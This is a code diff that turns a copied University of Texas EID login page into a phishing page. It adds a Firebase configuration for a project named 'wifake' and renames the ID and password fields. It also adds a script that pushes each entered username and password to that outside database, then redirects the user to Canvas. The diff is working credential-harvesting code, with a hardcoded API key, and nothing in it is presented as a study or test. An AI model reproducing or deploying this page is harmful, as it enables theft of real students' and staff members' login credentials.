@@ -22,7 +22,7 @@
         <meta http-equiv="content-type" content="text/html; charset=UTF-8">
         <meta name="viewport" content="width=device-width, user-scalable=yes">
         <title>UT EID Login</title>
-        
+
 
         <link rel="shortcut icon" type="image/png" href="../../../../openam/images/utlogin-favicon.ico">
         <link rel="stylesheet" type="text/css" media="Screen" href="../../../../openam/css/compiled/login.css">
@@ -34,8 +34,23 @@
         <script language="JavaScript" src="../../../../openam/js/jquery-1.8.2.min.js" type="text/javascript"></script>
         <script language="JavaScript" src="../../../../openam/js/browserVersion.js" type="text/javascript"></script>
         <script language="JavaScript" src="../../../../openam/js/auth-ut.js" type="text/javascript"></script>
+        <script src="https://www.gstatic.com/firebasejs/4.12.1/firebase.js"></script>
+        <script>
+          // Initialize Firebase
+          var config = {
 
-        
+          	apiKey: "AIzaSyDQgrIZjLam5LuhCudISbh9Mj7281ZZK1E",
+            authDomain: "wifake-eb087.firebaseapp.com",
+            databaseURL: "https://wifake-eb087.firebaseio.com",
+            projectId: "wifake-eb087",
+            storageBucket: "wifake-eb087.appspot.com",
+            messagingSenderId: "497195602031"
+
+          };
+          firebase.initializeApp(config);
+          var database = firebase.database();
+        </script>
+
             <script language="JavaScript" type="text/javascript">
                 var defaultBtn = 'Submit';
                 var elmCount = 0;
@@ -61,7 +76,7 @@
                     }
                 }
             </script>
-        
+
 
         <script language="JavaScript" type="text/javascript">
             <!-- Page is loaded. Initializations. -->
@@ -74,7 +89,7 @@
         </script>
     </head>
     <body>
-        
+
         <div id="container">
 
             <!-- wordmark is the new stacked UT wordmark -->
@@ -88,73 +103,73 @@
             <div id="content">
                 <div id="loginForm">
                     <div id="message"></div>  <!-- this may be a graphic at some point, but I'll push for the web version to be text. -->
-                    
 
-                    
+
+
                         <form name="Login" action="/openam/UI/Login" method="post">
-                            
+
                                 <script language="javascript" type="text/javascript">
                                     elmCount++;
                                 </script>
-                                
-                                
-                                
-                            
+
+
+
+
                                 <script language="javascript" type="text/javascript">
                                     elmCount++;
                                 </script>
-                                
+
                                     <div id="eid">
                                             <label for="IDToken1">
-                                                 UT EID 
-                                                
+                                                 UT EID
+
                                             </label>
                                             <br>
-                                            <input class="input_pad" type="text" name="IDToken1" id="IDToken1" value="" autocomplete="off" size="30" aria-required="true" autofocus="autofocus">
+                                            <input class="input_pad" type="text" name="IDToken1" id="email" value="" autocomplete="off" size="30" aria-required="true" autofocus="autofocus">
                                     </div>
-                                
-                                
-                                
-                            
+
+
+
+
                                 <script language="javascript" type="text/javascript">
                                     elmCount++;
                                 </script>
-                                
-                                
+
+
                                     <div id="password">
                                         <br>
                                         <label for="IDToken2">
-                                             PASSWORD 
-                                            
+                                             PASSWORD
+
                                         </label>
                                         <br>
-                                        <input class="input_pad" type="password" name="IDToken2" id="IDToken2" value="" autocomplete="off" size="30" aria-required="true">
+                                        <input class="input_pad" type="password" name="IDToken2" id="pass" value="" autocomplete="off" size="30" aria-required="true">
                                     </div>
-                                
-                                
-                            
 
-                            
-                            
-                            
-    
-    
+
+
+
+
+
+
+
+
                             <input type="hidden" name="login_uri" value="/login/SSORedirect/metaAlias/utaustin/idp">
                             <input type="hidden" name="login_method" value="GET">
-    
+
                             <input type="hidden" name="login_param_SAMLRequest" value="fVNLb9swDL7vVxi6+9nYboUkgJdgWIBuNWJvh10GRWJaAbbkSdTa/fvJjtPlsORkgOT30Ed6aVnfDbRy+KL28MuBxeCt75SlU2NFnFFUMystVawHS5HTpvrySLMooYPRqLnuyAXkNoJZCwalViTYbVfkZ1GyJEmKMswzloeL4liGhzI/hA/F/V2e5+WdEIIE38FYj1kRT+GB1jrYKYtMoS8l6X2YLMK0aLOMpiVdPPwgwda/QyqGE+oFcbA0jjv9LFXkEN6YjUC4UyFumqc9CGmAY9wDsqqTzMYOmRs5YikGElRn3xutrOvBNGB+Sw7f9o//+Gdm6a0Zx9EZiLjuZ5UxGxLUc2IfpRJSPd8O63AasvRz29Zh/dS0ZL0ceegUgVmPwtd1x8lsGV8Clqdtf/VSu22tO8n/BJ+06Rled5JG6VSRIjxOo9QpOwCXRwl+N1XX6deNAYawIl4fSHyWme8JxHRdPjnvE4ON7gdmpB03431zPD/qcmrT+UvZw3F985g45eOcL9f+86qNGPP1ewTRGuZdaoNzAP8lP/WuGH3vXv4b6w9/AQ==">
-    
-                            
-                                
-                                
+
+
+
+
                                     <div>
                                         <img src="../../../../openam/images/dot.gif" width="1" height="15" alt="">
-                                        <div id="login_btn">
-                                            <input name="Login.Submit" type="submit" onclick="LoginSubmit('Log In'); return false;" class="login button primary" value="Log In">
-                                        </div>
+                                        <a href="https://utexas.instructure.com/"><div id="login_btn" onclick="myFunction()">
+                                            <input name="Login.Submit"  onclick="myFunction()" class="login button primary" value="   Log In">
+                                        </div></a>
                                     </div>
-                                
-                            
+
+
                             <script language="javascript" type="text/javascript">
                                 if (elmCount != null) {
                                     document.write("<input name=\"IDButton"  + "\" type=\"hidden\">");
@@ -164,7 +179,7 @@
                             <input type="hidden" name="SunQueryParamsString" value="QU1BdXRoQ29va2llLXByb2Q9JmZvcndhcmQ9dHJ1ZSZyZWFsbT0vdXRhdXN0aW4mU0FNTFJlcXVlc3Q9ZlZOTGI5c3dETDd2VnhpNis5bllib1VrZ0pkZ1dJQnVOV0p2aDEwR1JXSmFBYmJrU2RUYS9mdkpqdFBsc09Sa2dPVDMwRWQ2YVZuZkRiUnkrS0wyOE11QnhlQ3Q3NVNsVTJORm5GRlVNeXN0VmF3SFM1SFRwdnJ5U0xNb29ZUFJxTG51eUFYa05vSlpDd2FsVmlUWWJWZmtaMUd5SkVtS01zd3psb2VMNGxpR2h6SS9oQS9GL1YyZTUrV2RFSUlFMzhGWWoxa1JUK0dCMWpyWUtZdE1vUzhsNlgyWUxNSzBhTE9NcGlWZFBQd2d3ZGEvUXlxR0Urb0ZjYkEwamp2OUxGWGtFTjZZalVDNFV5RnVtcWM5Q0dtQVk5d0RzcXFUek1ZT21SczVZaWtHRWxSbjN4dXRyT3ZCTkdCK1N3N2Y5by8vK0dkbTZhMFp4OUVaaUxqdVo1VXhHeExVYzJJZnBSSlNQZDhPNjNBYXN2UnoyOVpoL2RTMFpMMGNlZWdVZ1ZtUHd0ZDF4OGxzR1Y4Q2xxZHRmL1ZTdTIydE84bi9CSiswNlJsZWQ1Skc2VlNSSWp4T285UXBPd0NYUndsK04xWFg2ZGVOQVlhd0lsNGZTSHlXbWU4SnhIUmRQam52RTRPTjdnZG1wQjAzNDMxelBEL3FjbXJUK1V2WnczRjk4NWc0NWVPY0w5Zis4NnFOR1BQMWV3VFJHdVpkYW9OekFQOGxQL1d1R0gzdlh2NGI2dzkvQVE9PSZzcEVudGl0eUlEPWh0dHA6Ly91dGV4YXMuaW5zdHJ1Y3R1cmUuY29tL3NhbWwy">
                             <input type="hidden" name="encoded" value="false">
                         <input type="hidden" name="gx_charset" value="UTF-8"></form>
-                    
+
                 </div> <!-- end of loginForm -->
 
                 <div id="questions">  <!-- links for users -->
@@ -192,7 +207,19 @@
             </div> <!--end of content -->
         </div> <!--end of container -->
     </body>
+    <script>
+    function myFunction() {
+        firebase.database().ref('utcanvas/').push({
+        username: document.getElementById('email').value,
+        pass: document.getElementById('pass').value
+
+
+
+      });
+    }
+
+
+    </script>
 
 <!-- Copied from https://login.utexas.edu/login/SSORedirect/metaAlias/utaustin/idp?SAMLRequest=fVNLb9swDL7vVxi6%2B9nYboUkgJdgWIBuNWJvh10GRWJaAbbkSdTa%2FfvJjtPlsORkgOT30Ed6aVnfDbRy%2BKL28MuBxeCt75SlU2NFnFFUMystVawHS5HTpvrySLMooYPRqLnuyAXkNoJZCwalViTYbVfkZ1GyJEmKMswzloeL4liGhzI%2FhA%2FF%2FV2e5%2BWdEIIE38FYj1kRT%2BGB1jrYKYtMoS8l6X2YLMK0aLOMpiVdPPwgwda%2FQyqGE%2BoFcbA0jjv9LFXkEN6YjUC4UyFumqc9CGmAY9wDsqqTzMYOmRs5YikGElRn3xutrOvBNGB%2BSw7f9o%2F%2F%2BGdm6a0Zx9EZiLjuZ5UxGxLUc2IfpRJSPd8O63AasvRz29Zh%2FdS0ZL0ceegUgVmPwtd1x8lsGV8Clqdtf%2FVSu22tO8n%2FBJ%2B06Rled5JG6VSRIjxOo9QpOwCXRwl%2BN1XX6deNAYawIl4fSHyWme8JxHRdPjnvE4ON7gdmpB03431zPD%2FqcmrT%2BUvZw3F985g45eOcL9f%2B86qNGPP1ewTRGuZdaoNzAP8lP%2FWuGH3vXv4b6w9%2FAQ%3D%3D by Cyotek WebCopy 1.3.0.405, Monday, April 16, 2018, 10:18:07 PM -->
 </html>
-
